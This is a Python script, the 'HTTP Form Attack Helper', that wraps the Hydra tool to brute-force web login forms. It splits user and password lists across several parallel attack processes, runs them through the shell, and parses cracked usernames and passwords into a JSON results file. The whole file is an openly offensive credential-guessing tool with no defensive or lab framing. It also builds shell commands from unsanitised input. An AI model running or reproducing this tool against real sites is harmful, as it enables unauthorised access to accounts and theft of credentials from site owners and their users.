#!/usr/bin/env python3
import argparse
import os
import subprocess
import sys
import re
import json
from urllib.parse import urlparse

def validate_url(url):
    """Validate that the URL is properly formatted."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def extract_form_data(form_data):
    """Parse the form data string into components."""
    # Hydra format: "path:form_parameters:failed_condition"
    try:
        parts = form_data.split(':')
        if len(parts) != 3:
            raise ValueError("Form data must have 3 components separated by ':'")
        
        path = parts[0]
        form_params = parts[1]
        failed_condition = parts[2]
        
        return path, form_params, failed_condition
    except Exception as e:
        print(f"Error parsing form data: {e}")
        sys.exit(1)

def generate_hydra_command(target, form_data, userlist, passlist, num_agents=4, tasks=16, verbosity=0):
    """Generate Hydra commands for HTTP form attack."""
    path, form_params, failed_condition = extract_form_data(form_data)
    
    # Check if target is a URL or just a hostname
    if not target.startswith('http'):
        if path.startswith('/'):
            # Assume it's an HTTP service if the path starts with /
            target = f"http://{target}"
    
    commands = []
    
    # Parse username list to split workload
    with open(userlist, 'r') as f:
        users = [line.strip() for line in f if line.strip()]
    
    # If few users, split by passwords; if many users, split by users
    if len(users) <= num_agents:
        # Split by passwords
        with open(passlist, 'r') as f:
            total_passwords = sum(1 for _ in f)
        
        chunk_size = total_passwords // num_agents
        
        for i in range(num_agents):
            start = i * chunk_size
            end = None if i == num_agents - 1 else (i + 1) * chunk_size
            
            # Create temporary password file for this chunk
            temp_pass_file = f"tmp_pass_{i}.txt"
            with open(passlist, 'r') as source:
                with open(temp_pass_file, 'w') as target_file:
                    for j, line in enumerate(source):
                        if j >= start and (end is None or j < end):
                            target_file.write(line)
            
            # Generate command
            cmd = [
                "hydra",
                "-L", userlist,
                "-P", temp_pass_file,
                "-t", str(tasks),
                "-V" if verbosity > 0 else "",
                "-v" if verbosity > 1 else "",
                "-d" if verbosity > 2 else "",
                target,
                "http-form-post",
                f'"{path}:{form_params}:{failed_condition}"',
                "-o", f"http_form_results_{i}.txt"
            ]
            
            # Filter out empty strings
            cmd = [c for c in cmd if c]
            commands.append({
                "agent_id": i,
                "command": " ".join(cmd),
                "temp_file": temp_pass_file
            })
    else:
        # Split by users
        chunk_size = len(users) // num_agents
        
        for i in range(num_agents):
            start = i * chunk_size
            end = None if i == num_agents - 1 else (i + 1) * chunk_size
            
            # Create temporary user file for this chunk
            temp_user_file = f"tmp_user_{i}.txt"
            with open(temp_user_file, 'w') as f:
                for j in range(start, end if end is not None else len(users)):
                    f.write(f"{users[j]}\n")
            
            # Generate command
            cmd = [
                "hydra",
                "-L", temp_user_file,
                "-P", passlist,
                "-t", str(tasks),
                "-V" if verbosity > 0 else "",
                "-v" if verbosity > 1 else "",
                "-d" if verbosity > 2 else "",
                target,
                "http-form-post",
                f'"{path}:{form_params}:{failed_condition}"',
                "-o", f"http_form_results_{i}.txt"
            ]
            
            # Filter out empty strings
            cmd = [c for c in cmd if c]
            commands.append({
                "agent_id": i,
                "command": " ".join(cmd),
                "temp_file": temp_user_file
            })
    
    return commands

def main():
    parser = argparse.ArgumentParser(description="HTTP Form Attack Helper for Hydra")
    parser.add_argument("-t", "--target", required=True, help="Target URL or hostname")
    parser.add_argument("-f", "--form-data", required=True, 
                        help="Form data in Hydra format: 'path:form_parameters:failed_condition'")
    parser.add_argument("-L", "--userlist", required=True, help="Path to username list file")
    parser.add_argument("-P", "--passlist", required=True, help="Path to password list file")
    parser.add_argument("-a", "--agents", type=int, default=4, help="Number of agents (default: 4)")
    parser.add_argument("-T", "--tasks", type=int, default=16, 
                        help="Number of tasks per agent (default: 16)")
    parser.add_argument("-v", "--verbosity", type=int, default=0, 
                        help="Verbosity level (0-3, higher is more verbose)")
    parser.add_argument("-g", "--generate-only", action="store_true", 
                        help="Generate commands only, don't execute")
    
    args = parser.parse_args()
    
    if not validate_url(args.target) and "://" not in args.target:
        print(f"Warning: Target doesn't look like a URL. Will attempt to use as hostname.")
    
    if not os.path.exists(args.userlist):
        print(f"Error: Username list file not found: {args.userlist}")
        sys.exit(1)
    
    if not os.path.exists(args.passlist):
        print(f"Error: Password list file not found: {args.passlist}")
        sys.exit(1)
    
    print("=" * 70)
    print("HTTP Form Attack Helper")
    print("=" * 70)
    print(f"Target: {args.target}")
    print(f"Form Data: {args.form_data}")
    print(f"Username List: {args.userlist}")
    print(f"Password List: {args.passlist}")
    print(f"Number of Agents: {args.agents}")
    print(f"Tasks per Agent: {args.tasks}")
    print(f"Verbosity Level: {args.verbosity}")
    print("-" * 70)
    
    # Generate commands
    commands = generate_hydra_command(
        args.target, 
        args.form_data, 
        args.userlist, 
        args.passlist, 
        args.agents, 
        args.tasks, 
        args.verbosity
    )
    
    # If generate only, just print the commands
    if args.generate_only:
        print("\nGenerated Commands:")
        for cmd_data in commands:
            print(f"\nAgent {cmd_data['agent_id']}:")
            print(f"{cmd_data['command']}")
        
        print("\nTo use with the main swarm tool, create these temp files and then run:")
        print("python hydra_swarm.py ...")
        
        sys.exit(0)
    
    # Run the commands
    print("\nStarting HTTP Form Attack with multiple agents...")
    
    processes = []
    for cmd_data in commands:
        print(f"\nStarting Agent {cmd_data['agent_id']}...")
        print(f"Command: {cmd_data['command']}")
        
        process = subprocess.Popen(
            cmd_data['command'],
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        processes.append({
            "agent_id": cmd_data['agent_id'],
            "process": process,
            "temp_file": cmd_data['temp_file']
        })
    
    # Monitor processes
    try:
        # Wait for all processes to complete
        results = []
        for proc_data in processes:
            print(f"\nWaiting for Agent {proc_data['agent_id']} to complete...")
            stdout, stderr = proc_data['process'].communicate()
            
            # Look for results in output
            matches = re.findall(r'\[(\d+)\]\[http-form-post\] host: .* login: (.*) password: (.*)', stdout)
            for match in matches:
                results.append({
                    "agent_id": proc_data['agent_id'],
                    "host": args.target,
                    "username": match[1],
                    "password": match[2]
                })
            
            # Clean up temp files
            if os.path.exists(proc_data['temp_file']):
                os.remove(proc_data['temp_file'])
            
            # Also parse the output file
            result_file = f"http_form_results_{proc_data['agent_id']}.txt"
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read()
                    matches = re.findall(r'login: (.*) +password: (.*)', content)
                    for match in matches:
                        result = {
                            "agent_id": proc_data['agent_id'],
                            "host": args.target,
                            "username": match[0].strip(),
                            "password": match[1].strip()
                        }
                        if result not in results:
                            results.append(result)
        
        # Display results
        print("\n" + "=" * 70)
        print("ATTACK RESULTS")
        print("=" * 70)
        
        if results:
            print(f"Found {len(results)} valid credentials:")
            for i, result in enumerate(results, 1):
                print(f"{i}. Host: {result['host']}")
                print(f"   Username: {result['username']}")
                print(f"   Password: {result['password']}")
                print("-" * 40)
            
            # Save to JSON
            with open("http_form_results.json", 'w') as f:
                json.dump(results, f, indent=2)
            print(f"Results saved to http_form_results.json")
        else:
            print("No valid credentials found.")
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        for proc_data in processes:
            if proc_data['process'].poll() is None:
                proc_data['process'].terminate()
            
            # Clean up temp files
            if os.path.exists(proc_data['temp_file']):
                os.remove(proc_data['temp_file'])
    
    print("\nAttack completed.")

if __name__ == "__main__":
    main() 